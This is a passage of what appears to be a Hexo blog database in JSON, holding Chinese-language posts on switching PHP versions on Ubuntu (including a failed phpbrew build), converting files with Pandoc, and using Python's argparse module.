class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install python-software-properties</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php7.1</div></pre></td></tr></table></figure>\n<h2 id=\"PHP版本切换\"><a href=\"#PHP版本切换\" class=\"headerlink\" title=\"PHP版本切换\"></a>PHP版本切换</h2><h3 id=\"PHP-5-6-gt-PHP-7-1\"><a href=\"#PHP-5-6-gt-PHP-7-1\" class=\"headerlink\" title=\"PHP 5.6 =&gt; PHP 7.1\"></a>PHP 5.6 =&gt; PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php5.6</div><div class=\"line\">$ sudo a2enmod php7.1</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ update-alternatives --set php /usr/bin/php7.1</div></pre></td></tr></table></figure>\n<h3 id=\"PHP-7-1-gt-PHP-5-6\"><a href=\"#PHP-7-1-gt-PHP-5-6\" class=\"headerlink\" title=\"PHP 7.1 =&gt; PHP 5.6\"></a>PHP 7.1 =&gt; PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php7.1</div><div class=\"line\">$ sudo a2enmod php5.6</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ sudo update-alternatives --set php /usr/bin/php5.6</div></pre></td></tr></table></figure>\n<h2 id=\"使用phpBrew安装-切换PHP版本【失败】\"><a href=\"#使用phpBrew安装-切换PHP版本【失败】\" class=\"headerlink\" title=\"使用phpBrew安装/切换PHP版本【失败】\"></a>使用phpBrew安装/切换PHP版本【失败】</h2><p><a href=\"https://github.com/phpbrew/phpbrew\" target=\"_blank\" rel=\"external\">https://github.com/phpbrew/phpbrew</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev</div><div class=\"line\"></div><div class=\"line\"># openssl成功安装的</div><div class=\"line\">$ pkg-config --list-all | grep openssl</div><div class=\"line\">openssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38    # 出错！！！！</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s libraries</div><div class=\"line\"></div><div class=\"line\">----------------------</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div></pre></td></tr></table></figure>\n<blockquote>\n<p>  各种无言以对，花了两整天时间，无法解决！</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。<br>  结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~<br></p></blockquote>","more":"<p></p>\n<h2 id=\"PPA安装PHP\"><a href=\"#PPA安装PHP\" class=\"headerlink\" title=\"PPA安装PHP\"></a>PPA安装PHP</h2><h3 id=\"安装PHP-5-6\"><a href=\"#安装PHP-5-6\" class=\"headerlink\" title=\"- 安装PHP 5.6\"></a>- 安装PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install software-properties-common   # 安装PPA工具</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php5.6</div></pre></td></tr></table></figure>\n\n<h3 id=\"安装PHP-7-1\"><a href=\"#安装PHP-7-1\" class=\"headerlink\" title=\"- 安装PHP 7.1\"></a>- 安装PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install python-software-properties</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php7.1</div></pre></td></tr></table></figure>\n<h2 id=\"PHP版本切换\"><a href=\"#PHP版本切换\" class=\"headerlink\" title=\"PHP版本切换\"></a>PHP版本切换</h2><h3 id=\"PHP-5-6-gt-PHP-7-1\"><a href=\"#PHP-5-6-gt-PHP-7-1\" class=\"headerlink\" title=\"PHP 5.6 =&gt; PHP 7.1\"></a>PHP 5.6 =&gt; PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php5.6</div><div class=\"line\">$ sudo a2enmod php7.1</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ update-alternatives --set php /usr/bin/php7.1</div></pre></td></tr></table></figure>\n<h3 id=\"PHP-7-1-gt-PHP-5-6\"><a href=\"#PHP-7-1-gt-PHP-5-6\" class=\"headerlink\" title=\"PHP 7.1 =&gt; PHP 5.6\"></a>PHP 7.1 =&gt; PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php7.1</div><div class=\"line\">$ sudo a2enmod php5.6</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ sudo update-alternatives --set php /usr/bin/php5.6</div></pre></td></tr></table></figure>\n<h2 id=\"使用phpBrew安装-切换PHP版本【失败】\"><a href=\"#使用phpBrew安装-切换PHP版本【失败】\" class=\"headerlink\" title=\"使用phpBrew安装/切换PHP版本【失败】\"></a>使用phpBrew安装/切换PHP版本【失败】</h2><p><a href=\"https://github.com/phpbrew/phpbrew\">https://github.com/phpbrew/phpbrew</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev</div><div class=\"line\"></div><div class=\"line\"># openssl成功安装的</div><div class=\"line\">$ pkg-config --list-all | grep openssl</div><div class=\"line\">openssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38    # 出错！！！！</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s libraries</div><div class=\"line\"></div><div class=\"line\">----------------------</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div></pre></td></tr></table></figure>\n<blockquote>\n<p>  各种无言以对，花了两整天时间，无法解决！</p>\n</blockquote>"},{"title":"Pandoc | a universal document converter","date":"2017-05-02T02:02:42.000Z","_content":"\n近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。\n\n\n官方主页: [http://www.pandoc.org](http://www.pandoc.org)\n\nGet Start: [http://www.pandoc.org/getting-started.html](http://www.pandoc.org/getting-started.html)\n## 安装\n```bash\nbrew install pandoc     # 简单到爆\npandoc --verison        # 查看版本\n```\n<!-- more -->\n## 转换文件\nDemos : [http://www.pandoc.org/demos.html](http://www.pandoc.org/demos.html)\n```bash\npandoc test.md -f markdown -t html -s -o test.html\n# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.\n\npandoc -s -S MANUAL.txt -o example29.docx\n\npandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx\n\n```\n\n![本地图片](../img/dreamcruise.jpg)\n![远程图片](https://images.apple.com/v/home/df/images/promos/airpods_large.jpg)\n\n实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。","source":"_posts/Pandoc-a-universal-document-converter.md","raw":"---\ntitle: Pandoc | a universal document converter\ndate: 2017-05-02 10:02:42\ntags:\n---\n\n近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。\n\n\n官方主页: [http://www.pandoc.org](http://www.pandoc.org)\n\nGet Start: [http://www.pandoc.org/getting-started.html](http://www.pandoc.org/getting-started.html)\n## 安装\n```bash\nbrew install pandoc     # 简单到爆\npandoc --verison        # 查看版本\n```\n<!-- more -->\n## 转换文件\nDemos : [http://www.pandoc.org/demos.html](http://www.pandoc.org/demos.html)\n```bash\npandoc test.md -f markdown -t html -s -o test.html\n# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.\n\npandoc -s -S MANUAL.txt -o example29.docx\n\npandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx\n\n```\n\n![本地图片](../img/dreamcruise.jpg)\n![远程图片](https://images.apple.com/v/home/df/images/promos/airpods_large.jpg)\n\n实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。","slug":"Pandoc-a-universal-document-converter","published":1,"updated":"2017-06-08T13:05:25.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfrp000997uv1f67gzbv","content":"<p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>\n<p>官方主页: <a href=\"http://www.pandoc.org\" target=\"_blank\" rel=\"external\">http://www.pandoc.org</a></p>\n<p>Get Start: <a href=\"http://www.pandoc.org/getting-started.html\" target=\"_blank\" rel=\"external\">http://www.pandoc.org/getting-started.html</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install pandoc     <span class=\"comment\"># 简单到爆</span></div><div class=\"line\">pandoc --verison        <span class=\"comment\"># 查看版本</span></div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"转换文件\"><a href=\"#转换文件\" class=\"headerlink\" title=\"转换文件\"></a>转换文件</h2><p>Demos : <a href=\"http://www.pandoc.org/demos.html\" target=\"_blank\" rel=\"external\">http://www.pandoc.org/demos.html</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">pandoc test.md <span class=\"_\">-f</span> markdown -t html <span class=\"_\">-s</span> -o test.html</div><div class=\"line\"><span class=\"comment\"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"_\">-s</span> -S MANUAL.txt -o example29.docx</div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"built_in\">source</span>/_posts/Pandoc<span class=\"_\">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/05/Pandoc-a-universal-document-converter/img/dreamcruise.jpg\" alt=\"本地图片\"><br><img src=\"https://images.apple.com/v/home/df/images/promos/airpods_large.jpg\" alt=\"远程图片\"></p>\n<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>\n","site":{"data":{}},"excerpt":"<p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>\n<p>官方主页: <a href=\"http://www.pandoc.org\">http://www.pandoc.org</a></p>\n<p>Get Start: <a href=\"http://www.pandoc.org/getting-started.html\">http://www.pandoc.org/getting-started.html</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install pandoc     <span class=\"comment\"># 简单到爆</span></div><div class=\"line\">pandoc --verison        <span class=\"comment\"># 查看版本</span></div></pre></td></tr></table></figure>","more":"<h2 id=\"转换文件\"><a href=\"#转换文件\" class=\"headerlink\" title=\"转换文件\"></a>转换文件</h2><p>Demos : <a href=\"http://www.pandoc.org/demos.html\">http://www.pandoc.org/demos.html</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">pandoc test.md <span class=\"_\">-f</span> markdown -t html <span class=\"_\">-s</span> -o test.html</div><div class=\"line\"><span class=\"comment\"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"_\">-s</span> -S MANUAL.txt -o example29.docx</div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"built_in\">source</span>/_posts/Pandoc<span class=\"_\">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/05/Pandoc-a-universal-document-converter/img/dreamcruise.jpg\" alt=\"本地图片\"><br><img src=\"https://images.apple.com/v/home/df/images/promos/airpods_large.jpg\" alt=\"远程图片\"></p>\n<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>"},{"title":"Python argparse模块详解","date":"2017-06-08T02:27:24.000Z","_content":">    argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。\n>    官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。   \n>    https://docs.python.org/3/library/argparse.html\n\n## 使用步骤\n```\nimport argparse                     # 导入模板\n\nparser = argparse.ArgumentParser()  # 创建parser\n\nparser.add_argument()               # 添加参数\n\nargs = parser.parse_args()          # 参数解析\n```\n<!-- more -->\n## [ArgumentParser对象](https://docs.python.org/3/library/argparse.html#argumentparser-objects)\n    class argparse.ArgumentParser(\n        prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n        usage=None,                 # 替换默认的Usage信息\n        description=None,           # 程序简要信息说明(参数说明前)\n        epilog=None,                # 附加信息说明(参数说明后)\n        parents=[],                 # 继承父解析器(parser)\n        formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n        prefix_chars='-',           # 参数前缀符号(默认为-,如：-h/--help)\n        fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n        argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n        conflict_handler='error',   # 参数冲突处理\n        add_help=True,              # 帮助信息中默认添加\"-h, --help\"描述\n        allow_abbrev=True           # 允许参数缩写\n    )\n\n## [add_argument()方法](https://docs.python.org/3/library/argparse.html#the-add-argument-method)\n    ArgumentParser.add_argument(\n        name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n        [, action]      # 采取的基本操作\n                            store(默认)         存储参数值\n                            store_const        使用该字符串选项时，取用const值\n                            store_true         使用该字符串选项时，参数值置为True\n                            store_false        使用该字符串选项时，参数值置为False\n                            append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                            append_const       将多个字符串选项的const值合并到一个list\n                            count              统计选项出现的次数 （如：\"-vvv\",则最终值为3）\n                            help               parser默认会添加一个help action。(一般不用理会)\n                            version            打印版本信息\n                            也可以自定义action类\n        [, nargs]       # 该参数值要求的数量\n                            数值       指明参数个数\n                            ?         提供了参数则取参数值；\n                                        无参数但声明了选项字符串则取const值；\n                                        无参数也未声明选择字符串则取default值\n                            *         所有参数存入list\n                            +         与*类似，但参数个数不能为空\n                            argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n        [, const]       # action/nargs部分要求的常值\n                            1、当action=\"store_const\"或者\"append_const\"时需要设置\n                            2、当选项为(-f/--foo),nargs='?'，同时未提供具体参数时，取用该值。\n        [, default]     # 参数默认值\n        [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n        [, choices]     # 允许的参数值（白名单）,tuple/range\n        [, required]    # 选项是否必须，设置为True表示选项必填。\n        [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n        [, metavar]     # 定义参数在Usage信息中的名称\n        [, dest]        # 解析后的属性名称\n    )\n- ### [自定义action](https://docs.python.org/3/library/argparse.html#action-classes)\n\n    class argparse.**Action**(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)\n\n## [parse_args()方法](https://docs.python.org/3/library/argparse.html#the-parse-args-method)\n    ArgumentParser.parse_args(args=None, namespace=None)\n一般情况下，我们直接使用如下命令就可以了：\n```python\n# args=None, 程序将sys.argv作为参数代入\nargs = parse.parse_args()              \n\n# 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。\nargs = parser.parse_args(['1', '2', '3', '4'])\n\n# namespace=custom_class，将属性分配到一个已经存在的对象中。\nparser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99)\n```\n\n## [其它工具](https://docs.python.org/3/library/argparse.html#other-utilities)\n\n- ### [子命令](https://docs.python.org/3/library/argparse.html#sub-commands)\n    很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。\n\n    ArgumentParser.**add_subparsers**([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> subparsers = parser.add_subparsers(dest='subparser_name')\n    >>> subparser1 = subparsers.add_parser('1')\n    >>> subparser1.add_argument('-x')\n    >>> subparser2 = subparsers.add_parser('2')\n    >>> subparser2.add_argument('y')\n    >>> parser.parse_args(['2', 'frobble'])\n    Namespace(subparser_name='2', y='frobble')\n\n    ```\n\n\n- ### [文件类型对象](https://docs.python.org/3/library/argparse.html#filetype-objects)\n    add_argument()中的FileType的参数\"工厂\"。\n\n    class argparse.**FileType**(mode='r', bufsize=-1, encoding=None, errors=None)\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--raw', type=argparse.FileType('wb', 0))\n    >>> parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))\n    >>> parser.parse_args(['--raw', 'raw.dat', 'file.txt'])\n    Namespace(out=<_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'>, raw=<_io.FileIO name='raw.dat' mode='wb'>)\n\n    ```\n\n- ### [参数分组](https://docs.python.org/3/library/argparse.html#argument-groups)\n    在Usage信息中的参数分组，如pip -h可以看到\"Commands\",\"General Options\"分组。\n\n    ArgumentParser.**add_argument_group**(title=None, description=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='testPROG', add_help=False)\n    >>> group1 = parser.add_argument_group('group1', 'group1 description')\n    >>> group1.add_argument('foo', help='foo help')\n    >>> group2 = parser.add_argument_group('group2', 'group2 description')\n    >>> group2.add_argument('--bar', help='bar help')\n    \n    >>> parser.print_help()\n    \n    usage: testPROG [--bar BAR] foo\n\n    group1:\n    group1 description\n\n    foo    foo help\n\n    group2:\n    group2 description\n\n    --bar BAR  bar help\n    ```\n\n- ### [互斥](https://docs.python.org/3/library/argparse.html#mutual-exclusion)\n    参数互斥！\n\n    ArgumentParser.**add_mutually_exclusive_group**(required=False)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='PROG')\n    >>> group = parser.add_mutually_exclusive_group(required=True)\n    >>> group.add_argument('--foo', action='store_true')\n    >>> group.add_argument('--bar', action='store_false')\n    >>> parser.parse_args([])\n    usage: PROG [-h] (--foo | --bar)\n    PROG: error: one of the arguments --foo --bar is required\n    ```\n\n- ### [解析器默认配置](https://docs.python.org/3/library/argparse.html#parser-defaults)\n    在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。\n\n    ArgumentParser.**set_defaults**(**kwargs)       # 设置默认值\n\n    ArgumentParser.**get_default**(dest)            # 获取默认值\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('foo', type=int)\n    >>> parser.set_defaults(bar=42, baz='badger')   # 不审查是否在命令行中声明，故而bar，baz可以直接添加\n    >>> parser.parse_args(['736'])\n    Namespace(bar=42, baz='badger', foo=736)\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值\n    >>> parser.set_defaults(foo='spam')\n    >>> parser.parse_args([])\n    Namespace(foo='spam')\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='badger')\n    >>> parser.get_default('foo')                   # 获取默认值\n    'badger'\n\n    ```\n\n- ### [打印帮忙](https://docs.python.org/3/library/argparse.html#printing-help)\n    用于打印帮助信息。\n\n    ArgumentParser.**print_usage**(file=None)\n\n    ArgumentParser.**print_help**(file=None)\n\n    ArgumentParser.**format_usage**()\n\n    ArgumentParser.**format_help**()\n\n- ### [部分解析](https://docs.python.org/3/library/argparse.html#partial-parsing)\n    有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。\n\n    ArgumentParser.**parse_known_args**(args=None, namespace=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', action='store_true')\n    >>> parser.add_argument('bar')\n    >>> parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])\n    (Namespace(bar='BAR', foo=True), ['--badger', 'spam'])     # ['--badger', 'spam']即为多余的参数。\n    ```\n\n- ### [自定义文件解析](https://docs.python.org/3/library/argparse.html#customizing-file-parsing)\n\n- ### [退出方法](https://docs.python.org/3/library/argparse.html#exiting-methods)\n\n- ### [optparse代码升级](https://docs.python.org/3/library/argparse.html#upgrading-optparse-code)\n    原本argparse是与optparse保持兼容的，但是！@#￥%……&*（。升级办法如下：\n1.    Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.\n2.    Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.\n3.    Replace callback actions and the callback_* keyword arguments with type or action arguments.\n4.    Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).\n5.    Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.\n6.    Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.\n7.    Replace the OptionParser constructor version argument with a call to parser.add_argument('--version', action='version', version='<the version>').","source":"_posts/Python-argparse模块详解.md","raw":"---\ntitle: Python argparse模块详解\ndate: 2017-06-08 10:27:24\ntags: Python\n---\n>    argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。\n>    官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。   \n>    https://docs.python.org/3/library/argparse.html\n\n## 使用步骤\n```\nimport argparse                     # 导入模板\n\nparser = argparse.ArgumentParser()  # 创建parser\n\nparser.add_argument()               # 添加参数\n\nargs = parser.parse_args()          # 参数解析\n```\n<!-- more -->\n## [ArgumentParser对象](https://docs.python.org/3/library/argparse.html#argumentparser-objects)\n    class argparse.ArgumentParser(\n        prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n        usage=None,                 # 替换默认的Usage信息\n        description=None,           # 程序简要信息说明(参数说明前)\n        epilog=None,                # 附加信息说明(参数说明后)\n        parents=[],                 # 继承父解析器(parser)\n        formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n        prefix_chars='-',           # 参数前缀符号(默认为-,如：-h/--help)\n        fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n        argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n        conflict_handler='error',   # 参数冲突处理\n        add_help=True,              # 帮助信息中默认添加\"-h, --help\"描述\n        allow_abbrev=True           # 允许参数缩写\n    )\n\n## [add_argument()方法](https://docs.python.org/3/library/argparse.html#the-add-argument-method)\n    ArgumentParser.add_argument(\n        name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n        [, action]      # 采取的基本操作\n                            store(默认)         存储参数值\n                            store_const        使用该字符串选项时，取用const值\n                            store_true         使用该字符串选项时，参数值置为True\n                            store_false        使用该字符串选项时，参数值置为False\n                            append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                            append_const       将多个字符串选项的const值合并到一个list\n                            count              统计选项出现的次数 （如：\"-vvv\",则最终值为3）\n                            help               parser默认会添加一个help action。(一般不用理会)\n                            version            打印版本信息\n                            也可以自定义action类\n        [, nargs]       # 该参数值要求的数量\n                            数值       指明参数个数\n              